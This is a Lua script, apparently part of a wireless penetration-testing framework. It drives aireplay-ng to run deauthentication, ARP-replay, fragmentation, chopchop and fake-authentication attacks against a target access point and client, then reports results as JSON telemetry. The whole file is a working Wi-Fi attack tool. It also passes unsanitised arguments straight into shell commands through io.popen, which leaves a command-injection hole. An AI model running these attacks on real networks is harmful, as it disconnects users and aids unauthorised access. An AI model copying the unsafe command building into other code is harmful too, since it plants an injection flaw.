local iface = arg[1]
local attack_type = arg[2] or "deauth"
local bssid = arg[3] or ""
local station = arg[4] or ""
local count = tonumber(arg[5]) or 1

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local f = io.popen("iw dev " .. iface .. " info 2>/dev/null")
  if not f then return false end
  local out = f:read("*a")
  f:close()
  if out:find("type monitor") then return true end
  telemetry("monitor_fail", '{"error":"Interface not in monitor mode"}')
  return false
end

local attacks = {
  deauth = function()
    local cmd = "aireplay-ng --deauth " .. count .. " -a " .. bssid
    if station and #station > 0 then cmd = cmd .. " -c " .. station end
    return cmd .. " " .. iface .. " 2>/dev/null"
  end,
  ["arp-replay"] = function()
    return "aireplay-ng --arpreplay -b " .. bssid .. " -h " .. station .. " " .. iface .. " 2>/dev/null"
  end,
  frag = function()
    return "aireplay-ng --fragment -b " .. bssid .. " -h " .. station .. " " .. iface .. " 2>/dev/null"
  end,
  chopchop = function()
    return "aireplay-ng --chopchop -b " .. bssid .. " -h " .. station .. " " .. iface .. " 2>/dev/null"
  end,
  test = function()
    return "aireplay-ng --test " .. iface .. " 2>/dev/null"
  end,
  fakeauth = function()
    local cmd = "aireplay-ng --fakeauth " .. count .. " -a " .. bssid
    if station and #station > 0 then cmd = cmd .. " -h " .. station end
    return cmd .. " " .. iface .. " 2>/dev/null"
  end
}

local function run_attack(cmd)
  telemetry("attack_start", '{"type":' .. json_escape(attack_type) .. ',"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then
    telemetry("attack_fail", '{"type":' .. json_escape(attack_type) .. ',"error":"Failed to launch aireplay-ng"}')
    return false
  end
  local sent = 0
  local success = false
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("Deauth") or line:find("deauth") or line:find("ARP") then
      sent = sent + 1
    end
    if line:find("ack") or line:find("ACK") then
      success = true
      telemetry("packet_ack", '{"count":' .. tostring(sent) .. '}')
    end
    if line:find("Sending") then
      telemetry("sending", '{"detail":' .. json_escape(line:sub(1, 150)) .. '}')
    end
    if line:find("Failed") or line:find("failed") or line:find("No such") then
      telemetry("attack_warn", '{"detail":' .. json_escape(line:sub(1, 150)) .. '}')
    end
    if line:find("completed") or line:find("Done") then
      success = true
    end
  end
  f:close()
  telemetry("attack_result", '{"type":' .. json_escape(attack_type) .. ',"sent":' .. tostring(sent) .. ',"success":' .. tostring(success) .. '}')
  return success
end

if not iface then
  telemetry("error", '{"error":"Usage: aireplay_ng.lua <interface> <attack_type> [bssid] [station] [count]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

local ok, err = pcall(function()
  local builder = attacks[attack_type]
  if not builder then
    telemetry("error", '{"error":"Unknown attack type: ' .. attack_type .. '"}')
    os.exit(1)
  end
  local cmd = builder()
  run_attack(cmd)
end)

if not ok then
  telemetry("error", '{"error":' .. json_escape(tostring(err)) .. '}')
  os.exit(1)
end

telemetry("complete", '{"type":' .. json_escape(attack_type) .. '}')
